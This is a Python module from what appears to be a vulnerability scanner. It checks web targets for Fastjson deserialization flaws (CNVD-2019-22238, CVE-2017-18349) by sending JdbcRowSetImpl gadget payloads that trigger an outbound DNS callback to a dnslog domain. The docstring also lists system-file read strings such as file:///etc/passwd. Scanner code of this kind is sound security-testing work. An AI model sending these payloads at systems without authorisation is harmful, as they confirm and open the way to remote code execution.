#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Fastjson扫描类: 
        Fastjson <=1.2.47 反序列化 (远程代码执行)
            CNVD-2019-22238
        Fastjson <= 1.2.24 反序列化 (远程代码执行)
            CVE-2017-18349
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class Fastjson():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Fastjson'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2019_22238_payloads = [
            {
                'path': '',
                'data': '''{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"dns://dnsdomain/Cat",
        "autoCommit":true
    }
}'''
            }
        ]

        self.cve_2017_18349_payloads = [
            {
                'path': '',
                'data': '''{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"dns://dnsdomain/Cat",
        "autoCommit":true
    }
}'''
            }
        ]

    def cnvd_2019_22238_scan(self, url):
        ''' fastjson <= 1.2.47 反序列化漏洞 '''
        url = url.rstrip('/')
        sessid = '7741b152f4f34cf03332b54c1d1f4320'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unSerialize'
        vul_info['vul_id'] = 'CNVD-2019-22238'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'application/json'
        }

        headers = self.headers.copy()                               # * 复制一份headers, 防止污染全局headers
        headers.update(vul_info['headers'])                         # * 合并Headers

        for payload in self.cnvd_2019_22238_payloads:               # * Payload
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path']                                  # * Path
            data = payload['data'].replace('dnsdomain', dns_domain) # * Data
            target = url + path                                     # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,                                # * 使用该漏洞的特殊headers为headers, 使用正常的headers为self.headers
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(3)                                                # * dns查询可能较慢, 等一会
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Data': data,
                        'Headers': vul_info['headers']
                    }
                }
                return results

    def cve_2017_18349_scan(self, url):
        ''' fastjson <= 1.2.24 反序列化漏洞'''
        url = url.rstrip('/')
        sessid = '7d5ff4518944d45f35d9850f3d9be254'
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unSerialize'
        vul_info['vul_id'] = 'CVE-2017-18349'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'application/json'
        }

        headers = self.headers.copy()                               # * 复制一份headers, 防止污染全局headers
        headers.update(vul_info['headers'])                         # * 合并Headers

        for payload in self.cve_2017_18349_payloads:                # * Payload
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path']                                  # * Path
            data = payload['data'].replace('dnsdomain', dns_domain) # * Data
            target = url + path                                     # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,                                # * 使用该漏洞的特殊headers为headers, 使用正常的headers为self.headers
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(3)                                                # * dns查询可能较慢, 等一会
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Data': data,
                        'Headers': vul_info['headers']
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cnvd_2019_22238_scan, url=url),
            thread(target=self.cve_2017_18349_scan, url=url)
        ]

fastjson = Fastjson()